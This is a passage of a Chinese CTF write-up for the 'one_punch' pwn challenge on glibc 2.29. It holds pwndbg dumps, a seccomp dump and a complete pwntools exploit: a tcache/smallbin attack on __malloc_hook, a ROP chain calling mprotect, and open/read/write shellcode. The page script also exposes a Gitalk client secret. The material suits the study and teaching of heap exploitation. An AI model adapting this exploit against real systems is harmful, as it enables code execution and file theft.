class="string">"dddd"</span>,<span class="number">0x180</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"cccc"</span>,<span class="number">0xa0</span>)<span class="comment">#malloc_consolidate</span></span><br></pre></td></tr></table></figure>

<p>此时的堆布局：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">pwndbg</span>&gt; <span class="keyword">bins</span></span><br><span class="line"><span class="keyword">tcachebins</span></span><br><span class="line"><span class="keyword">0x90 </span>[  <span class="number">6</span>]: <span class="number">0x564cf556c850</span> —▸ <span class="number">0x564cf556c7c0</span> —▸ <span class="number">0x564cf556c730</span> —▸ <span class="number">0x564cf556c6a0</span> —▸ <span class="number">0x564cf556c610</span> —▸ <span class="number">0x564cf556c580</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x220</span> [  <span class="number">7</span>]: <span class="number">0x564cf556c140</span> —▸ <span class="number">0x7f1d7731dc30</span> (__malloc_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="symbol">fastbins</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line"><span class="symbol">unsortedbin</span></span><br><span class="line"><span class="symbol">all</span>: <span class="number">0x0</span></span><br><span class="line"><span class="symbol">smallbins</span></span><br><span class="line"><span class="number">0x90</span>: <span class="number">0x564cf556c4e0</span> —▸ <span class="number">0x564cf556c0a0</span> —▸ <span class="number">0x7f1d7731dd20</span> (main_arena+<span class="number">224</span>) ◂— <span class="number">0x564cf556c4e0</span></span><br><span class="line"><span class="symbol">largebins</span></span><br><span class="line"><span class="symbol">empty</span></span><br><span class="line"><span class="symbol">pwndbg</span>&gt; x/<span class="number">2</span>gx <span class="number">0x564cf556c4e0</span></span><br><span class="line"><span class="number">0x564cf556c4e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="symbol">pwndbg</span>&gt; x/<span class="number">2</span>gx <span class="number">0x564cf556c0a0</span></span><br><span class="line"><span class="number">0x564cf556c0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br></pre></td></tr></table></figure>

<p>然后修改chunk1的bk为heap_base+0x20，再分配一个相应大小的chunk触发攻击</p>
<p>chunk1会链入相应的tcache，heap_base+0x20处的fake_chunk会被当成bck，并会将smallbin赋值给其fd</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">pwndbg</span>&gt; x/<span class="number">10</span>gx <span class="number">0x564cf556b000</span></span><br><span class="line"><span class="number">0x564cf556b000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span></span><br><span class="line"><span class="number">0x564cf556b010</span>:	<span class="number">0x0700000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x564cf556b020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x564cf556b030</span>:	<span class="number">0x00007f1d7731dd20</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x564cf556b040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="symbol">pwndbg</span>&gt; x/<span class="number">4</span>gx <span class="number">0x00007f1d7731dd20</span></span><br><span class="line"><span class="number">0x7f1d7731dd20</span> &lt;main_arena+<span class="number">224</span>&gt;:	<span class="number">0x00007f1d7731dd10</span>	<span class="number">0x00007f1d7731dd10</span></span><br><span class="line"><span class="number">0x7f1d7731dd30</span> &lt;main_arena+<span class="number">240</span>&gt;:	<span class="number">0x0000564cf556c4e0</span>	<span class="number">0x0000564cf556b020</span></span><br></pre></td></tr></table></figure>

<p>此时tache已经被我们打烂了。。至于怎么烂的我也不知道。。还好我们之前已经修改了fd，这时直接调用malloc就可以劫持malloc_hook</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">pwndbg</span>&gt; <span class="keyword">bins</span></span><br><span class="line"><span class="keyword">tcachebins</span></span><br><span class="line"><span class="keyword">0x90 </span>[  <span class="number">7</span>]: <span class="number">0x564cf556c4f0</span> —▸ <span class="number">0x564cf556c850</span> —▸ <span class="number">0x564cf556c7c0</span> —▸ <span class="number">0x564cf556c730</span> —▸ <span class="number">0x564cf556c6a0</span> —▸ <span class="number">0x564cf556c610</span> —▸ <span class="number">0x564cf556c580</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x220</span> [ <span class="number">32</span>]: <span class="number">0x564cf556c140</span> —▸ <span class="number">0x7f1d7731dc30</span> (__malloc_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x230</span> [-<span class="number">35</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x240</span> [ <span class="number">49</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x250</span> [<span class="number">119</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">29</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x270</span> [<span class="number">127</span>]: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>因为这题使用 seccomp 开启了沙箱保护，只有白名单上的系统调用可以使用。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># seccomp-tools dump ./one_punch</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A == ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0003</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000f</span>  <span class="keyword">if</span> (A != rt_sigreturn) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A != exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A != open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0014</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A != brk) <span class="keyword">goto</span> <span class="number">0018</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A != mmap) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A != mprotect) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A != close) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0023</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0024</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>我们无法执行execve系统调用，只能用过orw（open/read/write）来读取flag</p>
<p>因为调用add函数时，程序先将我们的输入放在了栈上，所以考虑在此处构造rop</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">pwndbg</span>&gt; stack <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffd2f88c210</span> —▸ <span class="number">0x7f570f3814c0</span> (_dl_tunable_set_mallopt_check) ◂— <span class="keyword">mov </span>   eax, dword ptr [rdi]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7ffd2f88c218</span> ◂— <span class="number">0x10100000002</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rsi  <span class="number">0x7ffd2f88c220</span> —▸ <span class="number">0x7f570f3229a0</span> (init_cacheinfo+<span class="number">240</span>) ◂— <span class="keyword">pop </span>   rdi</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffd2f88c228</span> —▸ <span class="number">0x564a8ba4e000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffd2f88c230</span> —▸ <span class="number">0x7f570f3253a5</span> (insert_module+<span class="number">85</span>) ◂— <span class="keyword">pop </span>   rsi</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7ffd2f88c238</span> ◂— <span class="number">0x10000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffd2f88c240</span> —▸ <span class="number">0x7f570f302b9a</span> ◂— <span class="keyword">pop </span>   rdx</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffd2f88c248</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7ffd2f88c250</span> —▸ <span class="number">0x7f570f3ee370</span> (mprotect) ◂— <span class="keyword">mov </span>   eax, <span class="number">0xa</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7ffd2f88c258</span> —▸ <span class="number">0x564a8ba4f990</span> ◂— <span class="number">0x3148c03148e78948</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│      <span class="number">0x7ffd2f88c260</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* 'flag' */</span></span><br><span class="line"><span class="number">0</span>b:<span class="number">0058</span>│      <span class="number">0x7ffd2f88c268</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="symbol">...</span> ↓</span><br></pre></td></tr></table></figure>

<p>在调用calloc里有一系列抬高栈顶的操作，将malloc_hook改为add rsp,48h;ret就可以执行我们构造的rop</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span>*</span><br><span class="line">pdb = pwn_debug(<span class="string">"./one_punch"</span>)</span><br><span class="line">pdb.debug(<span class="string">'2.29'</span>)</span><br><span class="line">p = pdb.run(<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">libc = ELF(<span class="string">"/glibc/x64/2.29/lib/libc-2.29.so"</span>)</span><br><span class="line">one_gadget = [<span class="number">0xc1720</span>,<span class="number">0xdf212</span>,<span class="number">0xdf21e</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,content,size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"name: "</span>,content.ljust(size,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"name: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"idx: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"50056"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *$rebase(0x1235)"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">"aaaa"</span>,<span class="number">0x210</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_leak = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = heap_leak - <span class="number">0x4e0</span> - <span class="number">0x5c0</span> - <span class="number">0x40</span></span><br><span class="line">info(<span class="string">"heap_base:"</span> + hex(heap_base))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">"aaaa"</span>,<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"tcache"</span>,<span class="number">0x210</span>)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#fill tcache done</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"bbbb"</span>,<span class="number">0x210</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3b3ca0</span></span><br><span class="line">info(<span class="string">"libc_base:"</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]))<span class="comment">#change fd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">"aaaa"</span>,<span class="number">0x210</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">"aaaa"</span>,<span class="number">0x80</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"cccc"</span>,<span class="number">0x180</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"dddd"</span>,<span class="number">0x180</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"cccc"</span>,<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">0x180</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(heap_base+<span class="number">0x10a0</span>) + p64(heap_base + <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"eeee"</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x219a0</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x243a5</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x1b9a</span></span><br><span class="line">mprotect = libc.sym[<span class="string">'mprotect'</span>]</span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">	pop_rdi,</span><br><span class="line">	heap_base,</span><br><span class="line">	pop_rsi,</span><br><span class="line">	<span class="number">0x10000</span>,</span><br><span class="line">	pop_rdx,</span><br><span class="line">	<span class="number">7</span>,</span><br><span class="line">	mprotect,</span><br><span class="line">	heap_base+<span class="number">0x1990</span></span><br><span class="line">)</span><br><span class="line">sc = asm(</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	mov rdi, rsp;</span></span><br><span class="line"><span class="string">	xor rax, rax;</span></span><br><span class="line"><span class="string">	xor rsi, rsi;</span></span><br><span class="line"><span class="string">	mov al, 2;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	mov rsi, rdi;</span></span><br><span class="line"><span class="string">	mov rdi, rax;</span></span><br><span class="line"><span class="string">	mov dx, 0x123;</span></span><br><span class="line"><span class="string">	xor rax, rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	xor rdi,rdi;</span></span><br><span class="line"><span class="string">	add rdi, 1;</span></span><br><span class="line"><span class="string">	xor rax, rax;</span></span><br><span class="line"><span class="string">	mov al, 1;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0</span>,sc,<span class="number">0x100</span>)<span class="comment">#orw</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="string">"cccc"</span>)</span><br><span class="line">g()</span><br><span class="line">malloc(<span class="string">"ff"</span>+p64(libc.address+<span class="number">0xbe131</span>))<span class="comment">#add rsp,0x48;ret</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,(rop+<span class="string">"flag\x00"</span>),<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257901.htm</a></p>
<p><a href="http://blog.eonew.cn/archives/1233" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1233</a></p>

<div id="gitalk-container"></div>
<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

		<script>
		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
	    gitalkConfig.id = md5(location.pathname);
		var gitalk = new Gitalk(gitalkConfig);
	    gitalk.render("gitalk-container");
	    </script>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Sivona</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Enforce justice on behalf of Heaven.</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/glibc2-29/"># glibc2.29</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/09/09/arm-pwn-%E4%BB%8E-0-%E5%88%B0-0-1/">arm pwn 从 0 到 0.1</a>
            
            
            <a class="next" rel="next" href="/2020/05/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">虚拟机逆向学习</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
    <div>
        友情链接: 
       <div>
        <a class="theme-link"  href="https://sncker.github.io" target="_blank" rel="noopener"> SNCKER's blog </a><span>&nbsp;&nbsp;</span>
        <a class="theme-link"  href="https://blog.csdn.net/qq_43531895" target="_blank" rel="noopener"> EnJoy_July 's blog' </a><span>&nbsp;&nbsp;</span>
       </div>
       
      </div>
</footer>

    </div>
</body>
</html>
